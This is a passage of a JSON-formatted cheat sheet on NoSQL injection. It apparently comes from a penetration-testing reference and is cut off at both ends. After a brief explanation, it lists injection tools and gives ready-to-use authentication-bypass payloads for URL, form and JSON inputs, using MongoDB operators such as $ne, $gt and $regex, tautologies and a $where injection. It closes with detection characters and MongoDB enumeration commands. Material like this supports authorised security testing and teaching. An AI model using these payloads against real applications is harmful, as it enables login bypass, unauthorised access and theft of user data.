    "sections": [
        {
            "type": "hint",
            "variant": "info",
            "content": "NoSQL injection is a vulnerability where an attacker can interfere with the queries that an application makes to a NoSQL database. It often allows bypassing authentication, extracting data, or even executing system commands in certain environments like MongoDB's server-side JavaScript."
        },
        {
            "heading": "Automated Tools",
            "type": "code_block",
            "content": [
                "# --- NoSQL Injection Frameworks ---",
                "NoSQLMap          # python NoSQLMap.py",
                "nosqli            # nosqli scan -t http://target.com/api?id=test",
                "N1QLMap           # For Couchbase N1QL injection",
                "Mongobleed        # Information leakage in MongoDB",
                "Nosql-Exploitation-Framework # Comprehensive exploitation suite"
            ]
        },
        {
            "heading": "Auth Bypass & Logic Payloads",
            "type": "code_block",
            "content": [
                "# --- In URL / Form Data ---",
                "username[$ne]=toto&password[$ne]=toto   # $ne = Not Equal",
                "username[$gt]=&password[$gt]=          # $gt = Greater Than",
                "username[$regex]=.*&password[$regex]=.*",
                "",
                "# --- In JSON Payloads ---",
                "{ \"username\": { \"$ne\": null }, \"password\": { \"$ne\": null } }",
                "{ \"username\": { \"$gt\": \"\" }, \"password\": { \"$gt\": \"\" } }",
                "{ \"username\": { \"$regex\": \".*\" }, \"password\": { \"$regex\": \".*\" } }",
                "",
                "# --- Tautologies & Logic ---",
                "' || 'a'=='a",
                "' || '1' == '1' ; //",
                "true, $where: '1 == 1'"
            ]
        },
        {
            "heading": "Syntax & Commands",
            "type": "code_block",
            "content": [
                "# --- Detection Characters ---",
                "Trigger syntax errors: ' \" \\ ; { } ( )",
                "Comment characters: //, <!--",
                "",
                "# --- Common Operators ---",
                "$where, $gt, $lt, $ne, $regex, $in, $nin, $exists",
                "",
                "# --- Useful MongoDB Commands ---",
                "db.getCollectionNames()      # List collections",
                "db.users.find()              # List all users",
                "db.version()                 # Get version",
                "mongodbserver:port/status    # Internal status page"
            ]
        },
